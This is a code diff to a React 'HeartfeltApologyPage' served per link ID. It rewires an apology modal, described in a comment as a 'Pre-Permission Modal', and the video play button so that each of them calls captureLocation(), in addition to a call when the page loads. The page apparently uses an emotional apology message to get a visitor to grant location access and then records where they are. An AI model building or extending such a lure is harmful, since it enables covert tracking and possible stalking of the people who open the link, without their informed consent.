@@ -86,15 +86,14 @@ export default function HeartfeltApologyPage({ params }) {
     captureLocation();
   }, [linkId]);
 
-  // 2. Trigger Apology modal if needed
-  const handleRequestPlay = () => {
-    if (isPlaying) return;
-    setIsModalOpen(true);
+  // 2. Triggered when user confirms "Lanjutkan" on ApologyModal (hanya menutup modal dan lanjut ke landing page)
+  const handleConfirmModal = () => {
+    setIsModalOpen(false);
+    captureLocation();
   };
 
-  // 3. Triggered when user confirms "Lanjutkan" inside ApologyModal
-  const handleConfirmPlay = () => {
-    setIsModalOpen(false);
+  // 3. Triggered only when user manually taps play icon on video
+  const handlePlayVideo = () => {
     setIsLoading(true);
     setIsPlaying(true);
 
@@ -105,9 +104,7 @@ export default function HeartfeltApologyPage({ params }) {
       });
     }
 
-    // Geolocation trigger backup
     captureLocation();
-
     setIsLoading(false);
   };
 
@@ -301,7 +298,7 @@ export default function HeartfeltApologyPage({ params }) {
             {/* Elegant Minimalist Play Overlay */}
             {!isPlaying && (
               <div
-                onClick={handleRequestPlay}
+                onClick={handlePlayVideo}
                 style={{
                   position: 'absolute',
                   top: 0,
@@ -474,7 +471,7 @@ export default function HeartfeltApologyPage({ params }) {
       {/* Heartfelt Apology Pre-Permission Modal */}
       <ApologyModal
         isOpen={isModalOpen}
-        onConfirm={handleConfirmPlay}
+        onConfirm={handleConfirmModal}
       />
 
     </div>
